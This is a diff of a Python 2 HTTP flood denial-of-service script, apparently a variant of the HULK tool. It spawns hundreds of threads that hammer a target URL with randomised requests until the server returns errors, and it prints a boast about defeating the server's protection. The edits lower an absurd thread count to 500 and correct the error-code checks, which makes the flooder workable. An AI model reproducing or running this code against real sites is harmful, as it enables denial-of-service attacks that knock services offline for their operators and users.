@@ -102,7 +102,7 @@ print '---------------------------------------------------'
 def httpcall(url):
 	useragent_list()
 	referer_list()
-	code=2222222222222
+	code=222
 	if url.count("?")>0:
 		param_joiner="&"
 	else:
@@ -121,7 +121,7 @@ def httpcall(url):
 			#print e.code
 			set_flag(1)
  			print 'm60 Was Shotting All protection fo the server'
-			code=500000
+			code=500
 	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
@@ -137,7 +137,7 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==50000) & (safe==1):
+				if (code==500) & (safe==1):
 					set_flag(2)
 		except Exception, ex:
 			pass
@@ -171,7 +171,7 @@ else:
 			url = url + "/"
 		m = re.search('http\://([^/]*)/?.*', url)
 		host = m.group(1)
-		for i in range(5000000000):
+		for i in range(500):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
